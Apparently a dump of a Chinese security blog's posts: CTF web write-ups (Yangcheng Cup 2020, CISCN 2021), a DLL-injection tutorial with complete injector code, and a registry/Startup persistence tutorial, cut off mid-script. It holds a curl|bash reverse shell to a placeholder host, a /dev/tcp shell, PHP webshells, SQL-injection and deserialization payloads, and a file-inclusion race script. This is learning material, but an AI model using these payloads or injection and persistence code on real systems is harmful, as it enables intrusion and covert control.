name=&quot;file&quot;&gt; &lt;textarea style=&quot;border-radius: 1rem;&quot; type=&quot;text&quot; name=&quot;count&quot; rows=10 cols=50&gt;&lt;/textarea&gt;&lt;br /&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;?php if (isset($_GET[&quot;count&quot;])) { $count = $_GET[&quot;count&quot;]; if(preg_match('/;|base64|rot13|base32|base16|&lt;\\?php|#/i', $count)){ die('hacker!'); } echo &quot;&lt;h2&gt;The Count is: &quot; . exec('printf \\'' . $count . '\\' | wc -c') . &quot;&lt;/h2&gt;&quot;; } ?&gt;&lt;/body&gt;&lt;/html&gt; 读取check.php 1234567&lt;?php$pass = &quot;GWHT&quot;;// Cookie password.echo &quot;Here is nothing, isn't it ?&quot;;header('Location: /'); 反弹shell 1curl http://x.x.x.x/qwzf|bash qwzf文件内容 1bash -i &gt;&amp; /dev/tcp/x.x.x.x/12345 0&gt;&amp;1 在env中找到flag EasySer源码中有提示访问ser.php ssrf读取ser.php 1http://1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn/star1.php/star1.php?path=http%3A%2F%2F127.0.0.1%2Fser.php file_put_contents方法可以被利用 1234567891011121314151617181920212223242526272829303132333435363738394041 &lt;?phperror_reporting(0);if ( $_SERVER['REMOTE_ADDR'] == &quot;127.0.0.1&quot; ) { highlight_file(__FILE__);} $flag='{Trump_:&quot;fake_news!&quot;}';class GWHT{ public $hero; public function __construct(){ $this-&gt;hero = new Yasuo; } public function __toString(){ if (isset($this-&gt;hero)){ return $this-&gt;hero-&gt;hasaki(); }else{ return &quot;You don't look very happy&quot;; } }}class Yongen{ //flag.php public $file; public $text; public function __construct($file='',$text='') { $this -&gt; file = $file; $this -&gt; text = $text; } public function hasaki(){ $d = '&lt;?php die(&quot;nononon&quot;);?&gt;'; $a= $d. $this-&gt;text; @file_put_contents($this-&gt; file,$a); }}class Yasuo{ public function hasaki(){ return &quot;I'm the best happy windy man&quot;; }}?&gt; 构造exp，这里用php://filter绕过拼接的&lt;?php die(&quot;nononon&quot;);?&gt; 1234567891011121314151617&lt;?phpclass GWHT{ public $hero; public function __construct() { $this-&gt;hero=new Yongen(); }}class Yongen{ //flag.php public $file = &quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;; public $text = &quot;aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;;}$a = new GWHT;echo urlencode(serialize($a)); 构造ssrf请求触发反序列化 1http://1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn/star1.php/star1.php?path=http://127.0.0.1/ser.php&amp;c=O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A35%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D 成功写入文件，得到flag","link":"/2021/04/23/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020%E5%A4%8D%E7%8E%B0/"},{"title":"远程线程注入DLL","text":"原理在Windows操作系统中，每个进程的内存空间都是被隔离的，但是某些时候需要两个进程协调工作或者是跨进程操作。“远程线程”意思是跨进程，简单来说就是进程A在进程B中创建一个线程，这就叫远程线程。 DLL文件加载到进程的地址空间中，不会有进程名，隐蔽性较好，方法是强制让某进程加载DLL文件。只要有进程PID，先通过OpenProcess获取该进程句柄，再使用CreateRemoteThread。每个进程地址空间隔离，新创建的线程函数地址也应该在目的进程中，而不应该在本进程中，同样传递给线程函数的参数也应该在目的进程中，ThreadProc与LoadLibrary除了返回值以外基本相同，返回值的问题可以不考虑。直接把LoadLibrary函数作为线程函数创建到指定进程中。 LoadLibrary函数在Kernerl32.dll这个系统dll中，而Kernerl32这个DLL文件在任何进程中的加载位置都相同，也就是说LoadLibrary函数的地址在任何进程中的地址都相同，因此只要在进程中获取LoadLibray函数地址后，该地址在目标进程中也可以用。使用WriteProcessMemory把要注入的DLL文件写入目标进程，该函数第二个参数需要用VirtualAllocEx在目标进程申请一块内存，然后写入dll文件路径 实现过程原理：先获取进程句柄（OpenProcess）-&gt;在目标进程申请一块容纳dll文件路径名的内存（VirtualAllocEx）并写入dll路径名（WriteProcessMemory）-&gt;从Kernel32.dll中获取LoadLibraryA函数的地址(GetProcAddress函数)-&gt;在目标进程中创建一个线程（CreateRemoteThread），把线程函数地址(ThreadProc)替换为从Kernel32.dll中获取的LoadLibrary地址加载恶意dll 调整进程权限当前进程权限级别不够时，用OpenProcess()函数打开如smss.exe，winlogon.exe等系统进程时同样会失败，需要调整当前进程为”SeDebugPrivilege”权限。 调整权限3个步骤，调整权限使当前进程拥有”SeDebugPrivilege”权限，拥有这个权限后，当前进程可以访问一些受限的系统资源。 （1）使用OpenProcessToken函数打开当前进程的访问令牌 （2）使用LookupPrivilegeValue()函数取得描述权限的LUID （3）使用AdjustTokenPrivileges()函数调整访问令牌的权限。 调整权限代码 1234567891011121314151617181920212223242526bool AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken))//使用OpenProcessToken函数打开当前进程的访问令牌 return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp))//使用LookupPrivilegeValue()函数取得描述权限的LUID { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL))//使用AdjustTokenPrivileges()函数调整访问令牌的权限。 { CloseHandle(hToken); return FALSE; } return true;} 相关API函数OpenProcess有了进程ID后，用此函数获得进程句柄，返回值为进程的句柄，通过此句柄可结束进程 12345HANDLE OpenProcess( DWORD dwDesiredAccess,//进程想要取得的访问权限，PROCESS_ALL_ACCESS BOOL bInheritHandle,//获取的句柄是否可继承，一般FALSE DWORD dwProcessId//要打开的进程ID号); GetProcAddress成功返回导出函数或变量的地址,失败返回NULL 1234FARPROC GetProcAddress( HMODULE hModule,//LoadLibrary返回句柄 LPCSTR lpProcName//指定要获取函数地址的函数); CreateRemoteThread功能为创建远程线程，相比CreateThread多了一个hProcess参数，该参数指定要创建线程的进程句柄。CreateThread也是依赖于CreateRemoteThread，两个函数都必须传入线程函数参数（ThreadProc）。这里需要给lpStartAddress函数传入LoadLibraryA的地址替代原来调用的线程函数，LoadLibrary通过GetProcAddress函数从Kernel32.dll中获取。 123456789HANDLE CreateRemoteThread( HANDLE hProcess,//OpenProcess打开的线程句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,//线程函数地址，传入LoadLibrary，该函数地址位于Kernel32.dll，每个进程中都固定，GetProcAddress获取 LPVOID lpParameter,//传给线程函数参数 DWORD dwCreationFlags, LPDWORD lpThreadId); VirtualAllocEx在目标进程申请一块内存,返回目标进程申请到的内存块的起始地址 1234567LPVOID VirtualAllocEx( HANDLE hProcess,//指定要申请内存的进程句柄 LPVOID lpAddress,//指定申请的起始位置 NULL SIZE_T dwSize,//指定申请内存的长度 填入申请内存大小，为dll路径的大小 DWORD flAllocationType,//指定申请内存的状态类型 DWORD flProtect//指定申请内存的内存属性); WriteProcessMemory把lpBuffer中的内容写到hProcess指定进程中的lpBaseAddress，使用WriteProcessMemory把要注入的DLL文件路径写入目标进程 1234567BOOL WriteProcessMemory( HANDLE hProcess,//指定进程的进程句柄 LPVOID lpBaseAddress,//指定写入内存的起始地址，先用virtualAllocex在目标进程中申请内存，然后写入dll文件路径 LPCVOID lpBuffer,//指定写入内容的缓冲区 SIZE_T nSize,//写入内容长度 SIZE_T *lpNumberOfBytesWritten//接收实际写入内容长度); CloseHandle对打开的句柄进行关闭释放资源 123BOOL CloseHandle( HANDLE hObject); 代码恶意dll代码，功能为弹出MessageBox 123456789101112131415161718192021222324// dllmain.cpp : 定义 DLL 应用程序的入口点。#include &quot;pch.h&quot;#include &lt;tchar.h&gt;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ){ switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: MessageBox(NULL, _T(&quot;Dll Injected&quot;), _T(&quot;tips&quot;), MB_OK); case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE;} 注入代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104#include&lt;stdio.h&gt;#include&lt;windows.h&gt;#include&lt;stdlib.h&gt;#include&lt;Tlhelp32.h.&gt;#include&lt;tchar.h&gt;//提升权限代码BOOL AdjustProcessTokenPrivilege(){ LUID luidTmp; HANDLE hToken; TOKEN_PRIVILEGES tkp; if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) return false; if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luidTmp)) { CloseHandle(hToken); return FALSE; } tkp.PrivilegeCount = 1; tkp.Privileges[0].Luid = luidTmp; tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED; if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) { CloseHandle(hToken); return FALSE; } return true;}BOOL LoadDll(DWORD dwProcessID, char* szDllPathName){ // #0.提升进程为DEBUG权限 if (!AdjustProcessTokenPrivilege()) { printf(&quot;提权失败\\n&quot;); return 0; } //获取进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessID); if (hProcess == NULL) { printf(&quot;OPENPROCESS Error ! \\n&quot;); return FALSE; } //在目标进程分配内存并写入dll路径名 LPVOID lpAllocAddr = VirtualAllocEx(hProcess, NULL, strlen(szDllPathName) + 1, MEM_COMMIT, PAGE_READWRITE); if (lpAllocAddr == NULL) { printf(&quot;VIRTUALALLOCEX Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } BOOL bRet = WriteProcessMemory(hProcess, lpAllocAddr, szDllPathName, strlen(szDllPathName) + 1, NULL); if (!bRet) { printf(&quot;WriteProcessMemory Error ! \\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //获取LoadLibraryA 函数地址 FARPROC dwLoadAddr = GetProcAddress(GetModuleHandle(_T(&quot;kernel32.dll&quot;)), &quot;LoadLibraryA&quot;); if (!dwLoadAddr) { printf(&quot;GetProcAddress Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } //创建远程线程,加载dll HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwLoadAddr, lpAllocAddr, 0, NULL); if (!hThread) { printf(&quot;CreatRemoteTread Error !\\n&quot;); GetLastError(); CloseHandle(hProcess); return FALSE; } CloseHandle(hProcess); return TRUE;}int main(){ LoadDll(25028, (char*)&quot;C:\\\\Users\\\\Administrator\\\\source\\\\repos\\\\Project8\\\\Project8\\\\DllTest.dll&quot;); return 0;} 选择PID为25028的进程进行注入 注入成功，弹出MessageBox","link":"/2021/02/02/%E8%BF%9C%E7%A8%8B%E7%BA%BF%E7%A8%8B%E6%B3%A8%E5%85%A5DLL/"},{"title":"通过添加启动目录和和修改注册表进行权限维持","text":"添加启动目录由于启动目录不固定，需要先通过SHGetSpecialFolderPath获取启动路径，再CopyFile把要自启动的程序复制过去 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;int main(){ wchar_t StartupFolder[MAX_PATH] = {0}; wchar_t Path[MAX_PATH] = { 0 }; BOOL bRet= SHGetSpecialFolderPath(NULL, StartupFolder, CSIDL_STARTUP, FALSE); if (!bRet) { return -1; } GetModuleFileName(NULL, (LPWSTR)&amp;Path, MAX_PATH); wcscat_s(StartupFolder, L&quot;\\\\Persistance.exe&quot;); MessageBox(NULL, StartupFolder, L&quot;StartupFolder&quot;, MB_OK); if (CopyFile(Path, StartupFolder, FALSE)) { MessageBox(NULL, L&quot;succeed&quot;, L&quot;succeed&quot;, MB_OK); } return 0;} 修改注册表无需管理员权限即可修改HKEY_CURRENT_USER 在HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run中写入程序路径即可实现开机自启动 代码12345678910111213141516171819202122232425262728293031//添加自身到注册表启动项BOOL Regpersist(){ HKEY hKey; LPCTSTR szRun = _T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;); if (RegOpenKeyEx(HKEY_CURRENT_USER, szRun, 0, KEY_ALL_ACCESS, &amp;hKey) == ERROR_SUCCESS) { TCHAR szFileName[MAX_PATH] = { 0 }; DWORD dwRet = GetModuleFileName(NULL, szFileName, MAX_PATH); AfxMessageBox(szFileName); long lRet = RegSetValueEx(hKey, _T(&quot;Login&quot;), 0, REG_SZ, (BYTE*)szFileName, dwRet); RegCloseKey(hKey); if (lRet != ERROR_SUCCESS) return FALSE; //else // 删除启动; //{ // long lRet = RegDeleteValue(hKey, &quot;MFCLogin&quot;); // RegCloseKey(hKey); // if (lRet != ERROR_SUCCESS) // return FALSE; //} } else { MessageBox(_T(&quot;打开注册表失败&quot;)); return FALSE; } MessageBox(_T(&quot;添加成功&quot;)); return TRUE;} 相关API函数SHGetSpecialFolderPath该api用来获取指定的系统路径 123456BOOL SHGetSpecialFolderPathA( HWND hwnd, LPSTR pszPath, int csidl, //CSIDL_STARTUP BOOL fCreate); RegOpenKey打开注册表，成功返回ERROR_SUCCESS 12345LSTATUS RegOpenKeyA( HKEY hKey, //指定一个父键句柄 HKEY_CURRENT_USER LPCSTR lpSubKey,//指向一个字符串，表示要打开的子键名称,_T(&quot;Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run&quot;) PHKEY phkResult//返回打开的子键句柄 &amp;hKey); RegCloseKey关闭注册表，成功返回ERROR_SUCCESS 123LSTATUS RegCloseKey( HKEY hKey//打开的子键句柄); RegQueryValueEx注册表键值的查询 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegQueryValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName,//指定要被查询的键值的名称 LPDWORD lpReserved,//保留，始终NULL LPDWORD lpType,//返回被查询的值的类型 LPBYTE lpData,//返回被查询数据的缓冲区 LPDWORD lpcbData//缓冲区长度); RegSetValueEx注册表键值的写入 成功返回 ERROR_SUCCESS. 12345678LSTATUS RegSetValueExA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 HKEY_LOCAL LPCSTR lpValueName,//指定要被查询或写入的键值的名称 MFCLogin DWORD Reserved,//保留，始终为0 0 DWORD dwType,//写入键值的类型 REG_SZ const BYTE *lpData,//写入键值的缓冲区 路径 DWORD cbData//写入键值缓冲区的长度 sizeof); RegEnumValue注册表键值的枚举 成功返回 ERROR_SUCCESS. 12345678910LSTATUS RegEnumValueA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 DWORD dwIndex,//查询的索引值 LPSTR lpValueName,//健名的缓冲区 LPDWORD lpcchValueName,//健名缓冲区的长度 LPDWORD lpReserved,//保留，NULL LPDWORD lpType,//返回被查询的值的类型 LPBYTE lpData,//被查询键值的缓冲区 LPDWORD lpcbData//被查询键值的缓冲区的大小); RegDeleteValue注册表键值的删除 成功返回 ERROR_SUCCESS. 1234LSTATUS RegDeleteValueA( HKEY hKey,//指向一个已经被打开或创建的子键句柄 LPCSTR lpValueName//指向欲删除的键值项的名称); GetModuleFileName在开发过程中经常需要获得程序当前的运行目录，这时就可以使用GetModuleFileName 12345DWORD WINAPI GetModuleFileName( HMODULE hModule,//要获取文件名的模块名柄,null表示当前模块 LPTSTR lpFileName,//输出参数，存放取得的文件名 TCHAR lpfilename DWORD nSize//参数的长度 MAX_PATH);","link":"/2021/03/01/%E9%80%9A%E8%BF%87%E6%B7%BB%E5%8A%A0%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%92%8C%E5%92%8C%E4%BF%AE%E6%94%B9%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"},{"title":"CISCN2021 web部分题解","text":"easy_sql利用join进行无列名注入，先得到第一个列名为id 1uname=1mm1') and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b)c)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 继续读取第三个列名 1uname=1mm1') and updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 读取flag 1uname=1mm1') and updatexml(1,concat(0x7e,(select group_concat(`bac9c1a9-327a-4da1-9d66-cbc840b139a4`) from flag)),0)%23&amp;passwd=11&amp;Submit=%E7%99%BB%E5%BD%95 easy_source访问.index.php.swo得到部分源码，php内置类反序列化，根据提示猜到flag可能在注释里 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113&lt;?phpclass User{ private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; }}$rc=$_GET[&quot;rc&quot;]; //类名$rb=$_GET[&quot;rb&quot;]; //第二个参数$ra=$_GET[&quot;ra&quot;]; //第一个参数$rd=$_GET[&quot;rd&quot;]; //调用类的方法$method= new $rc($ra, $rb);var_dump($method-&gt;$rd()); 利用getDocComment读取注释 在ReflectionMethod类构造方法传入类名和方法名 读取flag 1http://124.70.0.162:24336/index.php?rc=ReflectionMethod&amp;ra=User&amp;rb=q&amp;rd=getDocComment middle_source扫描目录得到 1http://124.70.0.162:24363/you_can_seeeeeeee_me.php 利用session.upload_progress进行文件包含 https://www.freebuf.com/news/202819.html 12345678910111213141516171819202122232425262728293031#coding=utf-8import ioimport requestsimport threadingimport timesessid = 'TGAO'data = {&quot;cmd&quot;:&quot;var_dump(scandir('/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g'));&quot;,&quot;cf&quot;:&quot;../../../var/lib/php/sessions/cccdbabbhf/sess_&quot;+sessid}def write(session): while True: f = io.BytesIO(b'a' * 1024 * 50) resp = session.post( 'http://124.70.0.162:24363', data={'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': sessid} )def read(session): while True: resp = session.post('http://124.70.0.162:24363',data=data) print(resp.text) time.sleep(0.1) # if 'passwd' in resp.text: # print(resp.text) # break # event.clear() else: print(&quot;[+++++++++++++]retry&quot;)if __name__==&quot;__main__&quot;: event=threading.Event() with requests.session() as session: for i in xrange(1,30): threading.Thread(target=write,args=(session,)).start() for i in xrange(1,30): threading.Thread(target=read,args=(session,)).start() event.set() 得到etc目录下所有文件和目录，发现fecccibbdc目录 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234[0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;.pwd.lock&quot; [3]=&gt; string(3) &quot;X11&quot; [4]=&gt; string(12) &quot;adduser.conf&quot; [5]=&gt; string(12) &quot;alternatives&quot; [6]=&gt; string(7) &quot;apache2&quot; [7]=&gt; string(10) &quot;apparmor.d&quot; [8]=&gt; string(3) &quot;apt&quot; [9]=&gt; string(11) &quot;bash.bashrc&quot; [10]=&gt; string(17) &quot;bash_completion.d&quot; [11]=&gt; string(22) &quot;bindresvport.blacklist&quot; [12]=&gt; string(8) &quot;binfmt.d&quot; [13]=&gt; string(15) &quot;ca-certificates&quot; [14]=&gt; string(20) &quot;ca-certificates.conf&quot; [15]=&gt; string(6) &quot;cron.d&quot; [16]=&gt; string(10) &quot;cron.daily&quot; [17]=&gt; string(11) &quot;cron.weekly&quot; [18]=&gt; string(6) &quot;dbus-1&quot; [19]=&gt; string(12) &quot;debconf.conf&quot; [20]=&gt; string(14) &quot;debian_version&quot; [21]=&gt; string(7) &quot;default&quot; [22]=&gt; string(12) &quot;deluser.conf&quot; [23]=&gt; string(4) &quot;dhcp&quot; [24]=&gt; string(4) &quot;dpkg&quot; [25]=&gt; string(11) &quot;environment&quot; [26]=&gt; string(10) &quot;fecccibbdc&quot; [27]=&gt; string(5) &quot;fstab&quot; [28]=&gt; string(8) &quot;gai.conf&quot; [29]=&gt; string(5) &quot;group&quot; [30]=&gt; string(6) &quot;group-&quot; [31]=&gt; string(7) &quot;gshadow&quot; [32]=&gt; string(8) &quot;gshadow-&quot; [33]=&gt; string(9) &quot;host.conf&quot; [34]=&gt; string(8) &quot;hostname&quot; [35]=&gt; string(5) &quot;hosts&quot; [36]=&gt; string(4) &quot;init&quot; [37]=&gt; string(6) &quot;init.d&quot; [38]=&gt; string(7) &quot;inputrc&quot; [39]=&gt; string(7) &quot;insserv&quot; [40]=&gt; string(12) &quot;insserv.conf&quot; [41]=&gt; string(14) &quot;insserv.conf.d&quot; [42]=&gt; string(5) &quot;issue&quot; [43]=&gt; string(9) &quot;issue.net&quot; [44]=&gt; string(6) &quot;kernel&quot; [45]=&gt; string(11) &quot;ld.so.cache&quot; [46]=&gt; string(10) &quot;ld.so.conf&quot; [47]=&gt; string(12) &quot;ld.so.conf.d&quot; [48]=&gt; string(4) &quot;ldap&quot; [49]=&gt; string(5) &quot;legal&quot; [50]=&gt; string(13) &quot;libaudit.conf&quot; [51]=&gt; string(12) &quot;locale.alias&quot; [52]=&gt; string(10) &quot;locale.gen&quot; [53]=&gt; string(9) &quot;localtime&quot; [54]=&gt; string(8) &quot;logcheck&quot; [55]=&gt; string(10) &quot;login.defs&quot; [56]=&gt; string(11) &quot;logrotate.d&quot; [57]=&gt; string(11) &quot;lsb-release&quot; [58]=&gt; string(10) &quot;machine-id&quot; [59]=&gt; string(5) &quot;magic&quot; [60]=&gt; string(10) &quot;magic.mime&quot; [61]=&gt; string(7) &quot;mailcap&quot; [62]=&gt; string(13) &quot;mailcap.order&quot; [63]=&gt; string(10) &quot;mime.types&quot; [64]=&gt; string(11) &quot;mke2fs.conf&quot; [65]=&gt; string(14) &quot;modules-load.d&quot; [66]=&gt; string(4) &quot;mtab&quot; [67]=&gt; string(5) &quot;mysql&quot; [68]=&gt; string(8) &quot;networks&quot; [69]=&gt; string(13) &quot;nsswitch.conf&quot; [70]=&gt; string(3) &quot;opt&quot; [71]=&gt; string(10) &quot;os-release&quot; [72]=&gt; string(8) &quot;pam.conf&quot; [73]=&gt; string(5) &quot;pam.d&quot; [74]=&gt; string(6) &quot;passwd&quot; [75]=&gt; string(7) &quot;passwd-&quot; [76]=&gt; string(4) &quot;perl&quot; [77]=&gt; string(3) &quot;php&quot; [78]=&gt; string(7) &quot;profile&quot; [79]=&gt; string(9) &quot;profile.d&quot; [80]=&gt; string(9) &quot;python3.8&quot; [81]=&gt; string(8) &quot;rc.local&quot; [82]=&gt; string(5) &quot;rc0.d&quot; [83]=&gt; string(5) &quot;rc1.d&quot; [84]=&gt; string(5) &quot;rc2.d&quot; [85]=&gt; string(5) &quot;rc3.d&quot; [86]=&gt; string(5) &quot;rc4.d&quot; [87]=&gt; string(5) &quot;rc5.d&quot; [88]=&gt; string(5) &quot;rc6.d&quot; [89]=&gt; string(5) &quot;rcS.d&quot; [90]=&gt; string(11) &quot;resolv.conf&quot; [91]=&gt; string(3) &quot;rmt&quot; [92]=&gt; string(9) &quot;securetty&quot; [93]=&gt; string(8) &quot;security&quot; [94]=&gt; string(7) &quot;selinux&quot; [95]=&gt; string(6) &quot;shadow&quot; [96]=&gt; string(7) &quot;shadow-&quot; [97]=&gt; string(6) &quot;shells&quot; [98]=&gt; string(4) &quot;skel&quot; [99]=&gt; string(3) &quot;ssl&quot; [100]=&gt; string(6) &quot;subgid&quot; [101]=&gt; string(7) &quot;subgid-&quot; [102]=&gt; string(6) &quot;subuid&quot; [103]=&gt; string(7) &quot;subuid-&quot; [104]=&gt; string(11) &quot;sysctl.conf&quot; [105]=&gt; string(8) &quot;sysctl.d&quot; [106]=&gt; string(7) &quot;systemd&quot; [107]=&gt; string(8) &quot;terminfo&quot; [108]=&gt; string(8) &quot;timezone&quot; [109]=&gt; string(10) &quot;tmpfiles.d&quot; [110]=&gt; string(8) &quot;ucf.conf&quot; [111]=&gt; string(4) &quot;udev&quot; [112]=&gt; string(3) &quot;ufw&quot; [113]=&gt; string(13) &quot;update-motd.d&quot; [114]=&gt; string(3) &quot;vim&quot; [115]=&gt; string(6) &quot;wgetrc&quot; [116]=&gt; string(3) &quot;xdg&quot; 按照顺序遍历目录，得到flag路径 1/etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g 包含文件得到flag 1cf=../../../etc/fecccibbdc/bdaaaaedef/fcjgecchaa/idchbadaha/ehdchcjedh/fl444444g upload最后一波试卷的题目，比赛的时候没做出来，在buu上进行复现 有两个页面：index.php和example.php index.php：上传文件 example.php：解压文件 1234567891011121314151617181920212223242526272829303132//index.php&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) { highlight_file(__FILE__); die();}if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;upload&quot;) { if ($_FILES['postedFile']['size'] &gt; 1024*512) { die(&quot;这么大个的东西你是想d我吗？&quot;); } $imageinfo = getimagesize($_FILES['postedFile']['tmp_name']); if ($imageinfo === FALSE) { die(&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;); } if ($imageinfo[0] !== 1 &amp;&amp; $imageinfo[1] !== 1) { die(&quot;东西不能方方正正的话就很讨厌&quot;); } $fileName=urldecode($_FILES['postedFile']['name']); if(stristr($fileName,&quot;c&quot;) || stristr($fileName,&quot;i&quot;) || stristr($fileName,&quot;h&quot;) || stristr($fileName,&quot;ph&quot;)) { die(&quot;有些东西让你传上去的话那可不得了&quot;); } $imagePath = &quot;/var/www/html/image/&quot; . mb_strtolower($fileName); if(move_uploaded_file($_FILES[&quot;postedFile&quot;][&quot;tmp_name&quot;], $imagePath)) { echo &quot;upload success, image at $imagePath&quot;; } else { die(&quot;传都没有传上去&quot;); }} 解压文件 12345678910111213141516171819202122232425262728293031323334353637383940414243//example.php&lt;?phpif (!isset($_GET[&quot;ctf&quot;])) { highlight_file(__FILE__); die();}if(isset($_GET[&quot;ctf&quot;])) $ctf = $_GET[&quot;ctf&quot;];if($ctf==&quot;poc&quot;) { $zip = new \\ZipArchive(); $name_for_zip = &quot;example/&quot; . $_POST[&quot;file&quot;]; if(explode(&quot;.&quot;,$name_for_zip)[count(explode(&quot;.&quot;,$name_for_zip))-1]!==&quot;zip&quot;) { die(&quot;要不咱们再看看？&quot;); } if ($zip-&gt;open($name_for_zip) !== TRUE) { die (&quot;都不能解压呢&quot;); } echo &quot;可以解压，我想想存哪里&quot;; $pos_for_zip = &quot;/tmp/example/&quot; . md5($_SERVER[&quot;REMOTE_ADDR&quot;]); $zip-&gt;extractTo($pos_for_zip); $zip-&gt;close(); unlink($name_for_zip); $files = glob(&quot;$pos_for_zip/*&quot;); foreach($files as $file){ if (is_dir($file)) { continue; } $first = imagecreatefrompng($file); $size = min(imagesx($first), imagesy($first)); $second = imagecrop($first, ['x' =&gt; 0, 'y' =&gt; 0, 'width' =&gt; $size, 'height' =&gt; $size]); if ($second !== FALSE) { $final_name = pathinfo($file)[&quot;basename&quot;]; imagepng($second, 'example/'.$final_name); imagedestroy($second); } imagedestroy($first); unlink($file); }} 可以先在index.php上传一个包含php文件的zip文件，然后在example.php中解压 需要绕过两处 11.getImagesize 长度和宽度stristr过滤 绕过getimagesize getimagesize返回数组的索引 0，1分别是宽度和高度，也就是上传图片的宽度和高度必须都为1。绕过方法如下 1#define width 1#define height 1 利用unicode字符绕过stristr 直接上传zip文件，i会被过滤，由于使用了mb_strtolower处理文件名，因此可以使用unicode字符绕过 1&lt;?phpvar_dump(mb_strtolower('İ')==='i');echo urlencode(&quot;İ&quot;); //%C4%B0?&gt; 可以看到两者相等 利用隐写工具生成一个包含php代码的png文件，php代码为 1&lt;?=$_GET[0]($_POST[1]);?&gt; 上传脚本 123456789101112131415import requestsproxies = { &quot;http&quot;: 'http://127.0.0.1:8080', &quot;https&quot;: 'http://127.0.0.1:8080'}url=&quot;http://e0a5fbcf-c0bc-44e2-b258-a10f8553f7f3.node3.buuoj.cn/?ctf=upload&quot;data = { 'postedFile': 'nginx'}files = {'postedFile': 